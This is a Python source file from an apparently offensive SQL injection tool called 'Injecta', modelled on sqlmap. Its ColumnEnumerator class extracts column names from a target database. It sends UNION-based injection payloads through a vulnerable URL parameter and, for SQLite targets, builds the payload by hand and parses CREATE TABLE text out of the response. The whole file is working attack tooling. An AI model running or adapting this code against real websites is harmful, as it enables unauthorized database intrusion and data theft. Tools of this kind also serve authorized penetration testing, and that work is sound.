"""
Injecta — Column enumeration (sqlmap-style extraction)
"""
import re
from typing import Any, Dict, List
from injecta.enum.extract import extract_clean, split_groupped, extract_orig_val


class ColumnEnumerator:
    def __init__(self, requester, config, logger, payloads, injection_info: Dict[str, Any]):
        self.req = requester
        self.config = config
        self.log = logger
        self.payloads = payloads
        self.info = injection_info
        self.dbms = getattr(payloads, "name", "") if payloads else ""

    def enumerate(self, url: str, param: str, db: str, table: str) -> List[str]:
        columns = []
        queries = self.payloads.columns(db, table)
        cols = self.info.get("column_count", 1)
        pos = self.info.get("data_pos", 1)

        for q in queries:
            results = extract_clean(self.req, url, param, q, cols, pos, self.dbms)
            if results:
                for r in results:
                    columns.extend(split_groupped(r))
                break

        if not columns and hasattr(self.payloads, 'name') and self.payloads.name == 'sqlite':
            orig_val = extract_orig_val(url, param)
            for q in self.payloads.columns(db, table):
                prefix = f"{orig_val}'" if orig_val else "'"
                payload = f"{prefix} UNION {q}-- -"
                _, resp_text, _ = self.req.test_raw(url, payload, param)
                if resp_text and 'CREATE TABLE' in resp_text:
                    cols2 = re.findall(r'`?(\w+)`?\s+\w+', resp_text.split('CREATE TABLE')[1].split(')')[0])
                    columns = [c for c in cols2 if c.lower() not in ('table', 'create', 'primary', 'key')]
                    break

        return list(set(columns))
